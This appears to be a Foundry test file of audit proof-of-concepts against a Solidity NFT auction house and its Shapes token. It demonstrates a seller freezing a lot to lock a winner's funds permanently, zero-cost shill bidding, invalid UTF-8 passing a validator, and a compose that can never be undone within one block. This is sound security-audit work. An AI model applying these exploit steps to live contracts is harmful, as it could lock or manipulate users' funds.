// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {ShapeAuctionHouse} from "../src/ShapeAuctionHouse.sol";
import {ShapeCollection} from "../src/ShapeCollection.sol";
import {ShapeRenderer} from "../src/ShapeRenderer.sol";
import {Shapes} from "../src/Shapes.sol";
import {IShapeAuctionHouse} from "../src/interfaces/IShapeAuctionHouse.sol";

/// @dev A lot whose transfers the seller can switch off after the auction is under way.
contract FreezableLot is ERC721 {
    bool public frozen;

    constructor() ERC721("Freezable", "FRZ") {}

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    function freeze() external {
        frozen = true;
    }

    function _update(address to, uint256 id, address auth) internal override returns (address) {
        require(!frozen, "frozen");
        return super._update(to, id, auth);
    }
}

contract AuditPoC is Test {
    Shapes internal shapes;
    ShapeRenderer internal renderer;
    ShapeCollection internal collection;
    ShapeAuctionHouse internal house;
    FreezableLot internal lot;

    address internal seller = makeAddr("seller");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal feeRecipient = makeAddr("feeRecipient");

    function setUp() public {
        renderer = new ShapeRenderer();
        collection = new ShapeCollection(address(renderer));
        shapes = new Shapes(100, feeRecipient, address(renderer), address(collection));
        house = new ShapeAuctionHouse(address(shapes));
        lot = new FreezableLot();

        vm.deal(alice, 10_000 ether);
        vm.deal(bob, 10_000 ether);
        vm.deal(seller, 10 ether);

        lot.mint(seller, 1);
        vm.prank(seller);
        lot.setApprovalForAll(address(house), true);
        vm.prank(alice);
        shapes.setApprovalForAll(address(house), true);
        vm.prank(bob);
        shapes.setApprovalForAll(address(house), true);
    }

    /* ---------------- H-1: winning bid locked forever --------------- */

    function test_PoC_H1_WinnerCardsLockedWhenLotTransferReverts() public {
        vm.prank(seller);
        uint256 id = house.createAuction(address(lot), 1, 24 hours, 1, 500, 15 minutes);

        // Alice wins with 10 ETH of real, redeemable Shapes.
        uint256[] memory none = new uint256[](0);
        uint256 cost = 10 ether + shapes.mintFeeFor(10 ether);
        vm.prank(alice);
        house.bid{value: cost}(id, none, 10 ether);

        uint256[] memory escrowed = house.escrowedCards(id, alice);
        assertEq(escrowed.length, 1);
        assertEq(shapes.backingOf(escrowed[0]), 10 ether);
        assertEq(house.auctions(id).highestBidder, alice);

        // The seller bricks the lot after the bid is locked in. Any NFT that can be
        // paused, blocklisted, or upgraded gets here without a bespoke contract.
        lot.freeze();
        vm.warp(block.timestamp + 25 hours);

        // Settlement is the only thing that flips `settled`, and it reverts.
        vm.expectRevert(bytes("frozen"));
        house.settle(id);

        // The winner cannot pull their own cards back: they are still `highestBidder`.
        vm.prank(alice);
        vm.expectRevert(
            abi.encodeWithSelector(IShapeAuctionHouse.NothingToWithdraw.selector, id, alice)
        );
        house.withdraw(id);

        // And the seller cannot pull them either, because the auction never settled.
        vm.prank(seller);
        vm.expectRevert(abi.encodeWithSelector(IShapeAuctionHouse.AuctionStillRunning.selector, id));
        house.claimProceeds(id);

        // 10 ETH of redeemable backing is now owned by the house with no path out.
        assertEq(shapes.ownerOf(escrowed[0]), address(house));
        assertEq(address(shapes).balance, 10 ether);
    }

    /* -------- H-1 variant: never-escrowed lot, same lock ---------- */

    function test_PoC_H1b_CancelDoesNotFreeBidders() public {
        vm.prank(seller);
        uint256 id = house.createAuction(address(lot), 1, 24 hours, 1, 500, 15 minutes);

        uint256[] memory none = new uint256[](0);
        uint256 cost = 1 ether + shapes.mintFeeFor(1 ether);
        vm.prank(alice);
        house.bid{value: cost}(id, none, 1 ether);

        lot.freeze();
        vm.warp(block.timestamp + 25 hours);

        // cancelAuction is closed once a bid lands, so it is not an escape hatch either.
        vm.prank(seller);
        vm.expectRevert(IShapeAuctionHouse.InvalidAuction.selector);
        house.cancelAuction(id);
    }

    /* ---------- M: seller shill-bids its own auction for free --------- */

    function test_PoC_SellerCanShillBidAtZeroCost() public {
        vm.prank(seller);
        uint256 id = house.createAuction(address(lot), 1, 24 hours, 1, 500, 15 minutes);

        // Seller mints one 1 ETH card up front and bids it.
        vm.deal(seller, 100 ether);
        vm.startPrank(seller);
        shapes.setApprovalForAll(address(house), true);
        uint256 card = shapes.mint{value: 1 ether + shapes.mintFeeFor(1 ether)}(1 ether);
        uint256[] memory ids = new uint256[](1);
        ids[0] = card;
        house.bid(id, ids, 0);
        vm.stopPrank();

        // A real bidder now has to clear the shilled floor.
        assertEq(house.minimumBid(id), 105);

        uint256[] memory none = new uint256[](0);
        vm.prank(alice);
        house.bid{value: 1.5 ether + shapes.mintFeeFor(1.5 ether)}(id, none, 1.5 ether);

        // Seller pulls the shill bid straight back. Net cost: gas.
        vm.prank(seller);
        house.withdraw(id);
        assertEq(shapes.ownerOf(card), seller);
        assertEq(shapes.backingOf(card), 1 ether);
    }

    /* ------------- copy validator: invalid UTF-8 passes ------------- */

    function test_PoC_OwnerCopyCanEmitInvalidUtf8() public {
        vm.deal(address(this), 1 ether);
        shapes.mint{value: 0.01 ether + shapes.mintFeeFor(0.01 ether)}(0.01 ether);

        // 0xFF is never a legal UTF-8 byte. The validator only rejects `"`, `\` and C0.
        bytes memory bad = hex"ff";
        shapes.setTokenCopy("Shape ", string(bad));
        assertEq(bytes(shapes.tokenDescription())[0], bytes1(0xff));

        shapes.setCollectionCopy(string(bad), string(bad));
        assertEq(bytes(shapes.collectionName())[0], bytes1(0xff));

        // Both still render; the produced document is simply not valid UTF-8.
        shapes.tokenURI(0);
        shapes.contractURI();
    }

    /* --------- compose is cheaper than the decompose that undoes it -------- */

    function test_PoC_ComposeDecomposeGasAsymmetry() public {
        vm.deal(address(this), 1_000 ether);
        uint256 n = 99; // survivor + 99 dust = 1 ETH
        uint256 first = shapes.mintBatch{value: (0.01 ether + shapes.mintFeeFor(0.01 ether)) * (n + 1)}(
            0.01 ether, n + 1
        );

        uint256[] memory burnIds = new uint256[](n);
        for (uint256 i = 0; i < n; ++i) {
            burnIds[i] = first + 1 + i;
        }

        uint256 g0 = gasleft();
        shapes.compose(first, burnIds);
        uint256 composeGas = g0 - gasleft();

        uint256 g1 = gasleft();
        shapes.decompose(first);
        uint256 decomposeGas = g1 - gasleft();

        console.log("inputs        ", n);
        console.log("compose  gas  ", composeGas);
        console.log("decompose gas ", decomposeGas);
        console.log("ratio x1000   ", (decomposeGas * 1000) / composeGas);
    }


    /* ---- M: a legal compose that no block can ever decompose ---- */

    function test_PoC_ComposeCanBecomeIrreversible() public {
        vm.deal(address(this), 10_000 ether);
        uint256 n = 499; // survivor + 499 dust = 5 ETH, a real denomination
        uint256 first;
        {
            uint256 per = 0.01 ether + shapes.mintFeeFor(0.01 ether);
            first = shapes.mintBatch{value: per * 250}(0.01 ether, 250);
            shapes.mintBatch{value: per * 250}(0.01 ether, 250);
        }
        uint256[] memory burnIds = new uint256[](n);
        for (uint256 i = 0; i < n; ++i) {
            burnIds[i] = first + 1 + i;
        }

        uint256 g0 = gasleft();
        shapes.compose(first, burnIds);
        uint256 composeGas = g0 - gasleft();
        assertEq(shapes.backingOf(first), 5 ether);

        // Give decompose a full 30M-gas block and watch it run out.
        (bool ok,) = address(shapes).call{gas: 30_000_000}(
            abi.encodeWithSignature("decompose(uint256)", first)
        );
        console.log("compose gas   ", composeGas);
        console.log("decompose ok  ", ok);
        assertLt(composeGas, 30_000_000, "compose fit in a block");
        assertFalse(ok, "decompose should not fit in a block");

        // The ETH is not lost: the survivor still redeems for the full 5 ETH.
        uint256 before = address(this).balance;
        shapes.redeem(first);
        assertEq(address(this).balance - before, 5 ether);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
